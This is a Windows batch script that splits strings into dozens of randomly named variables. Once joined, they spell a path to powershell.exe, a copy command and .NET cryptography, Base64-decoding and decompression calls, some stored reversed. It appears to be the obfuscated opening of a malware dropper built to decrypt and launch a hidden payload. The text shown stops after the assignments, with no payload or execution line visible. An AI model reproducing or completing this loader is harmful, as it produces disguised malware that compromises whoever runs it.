@echo off
set "CvgAcxmYSL=y "
set "jsuZGkiGVT=em"
set "vPZGXPfrWl=Po"
set "rqHReboNya=st"
set "IFrHEfbgkr=he"
set "bDwdMGswzt=Sy"
set "QrgbUQyztD= /"
set "qUarrsAgsh=1."
set "bDNjSCPzvo=ws"
set "aLHCvLbbOR=:\"
set "bkSTgaMsvV=po"
set "bCoyQvfVDM=we"
set "yLBGrRPEWU=do"
set "MyIKTzppsw=ll"
set "lLFKHKzZDN=py"
set "NvNMVAdcoV=ow"
set "tRKNmKiTyg=xe"
set "CkwNmrzlqE=rS"
set "JknbadBMUN=0\"
set "VmujhJixwB=in"
set "GhKwRjKkOi=ll"
set "YjWlNmGVII=rs"
set "hGCUEsPtHo=\W"
set "xTWIMksmuG=\v"
set "ItsldctLtX=nd"
set "FkttOSnHgT=.e"
set "bAAdVjZKao=32"
set "CHwXtaNhhV=co"
set "TIbhgIMUIC=he"
set "xcAuAnuJVp=Wi"
set "JxlLpjaTkq=s\"
set "qAAcmRyrsA=we"
set "mAnLEvmrtu= C"
set "yaaGpnbWwD= %~dp0"
set "RZuWXpotES=cd"
set "jOzLCgIbSU=daeR"
set "UyvPylpTvf=ypto"
set "zsvrSSWlaj=yhvY"
set "ucPlVfUXKj=$vhD"
set "mGqHhdFyTl=yTo("
set "PEHeocJzPV=stem"
set "qAwJdjclaR=ress"
set "KuLgeXXhHj=M = "
set "itFZswAUNQ=16] "
set "rPLHjJjlQY=oL'["
set "bAViVtfjcP=)($G"
set "utjakBMPYF=BC;$"
set "lHSyqnLwet=ach "
set "btERyQcPRt=Y = "
set "JxzVwllJXQ=ment"
set "SvglDKJKIu=.Con"
set "zdcygyvmWk=($Tr"
set "qfyFwSNBDq= = ["
set "QIjZZFJTbY=nirt"
set "osBNyUrSmn=YxVw"
set "tHpNTYrBfk=Star"
set "RwlVBSLTva=ck($"
set "CsxUCXwTBF=);$v"
set "XLrHpqDaLY=ay()"
set "jctwggAeBq=;$uH"
set "FShjHfkdBF=n ''"
set "akGjSAcfxr=hy.A"
set "DgwbkeOeQY=($Tr"
set "dnbekTjRQz=-4] "
set "hWrgwNzdCY=Y = "
set "DPKVpKRZJF=yste"
set "ddbrOHmHRZ=join"
set "kORaAJphgs=gnir"
set "NBmTnwMQPw=SY, "
set "DwMRUdMhHe=and "
set "kAsSUdHtUW== [S"
set "JfINpCFQmt= = $"
set "unDxmwBQmA=raph"
set "hXOCNnrXgE=..-1"
set "SbbEGTqXBr=tS46"
set "mhdgUpmwsn=);$v"
set "QTuRgvZYbq=hS ="
set "FBqRznzHOn= = N"
set "GEVMSKJpoT=RmAx"
set "KFbRbRbDqE=ose("
set "wQAMUYLXYr=New-"
set "cJtJqPoERz=.Cop"
set "artzutgbqH=IBJp"
set "ZXTUOAyKUN=KkUB"
set "UiaUBtChvI=m.IO"
set "QBUtCYgenV=ptor"
set "CsmqOAUVZz= [Sy"
set "sSqFDATOgf=.Com"
set "PZbknSENBM=hS.T"
set "WjkrlmXzuA=a.En"
set "mhdIGJYZyO=('Tg"
set "oTevgmZWYp= '')"
set "XUicQZgULy=ddin"
set "TrLNcDQMOn=TllA"
set "AgumeKuNxU=join"
set "JwbqBbrSgq=rity"
set "CIzMPSzhSE=$iyh"
set "RLjYkEEclI=vert"
set "pgMHOOobzi=vY ="
set "CBkygPZTGe=l5E7"
set "LoenoNyfBq=eam("
set "msEcctWaun=Comp"
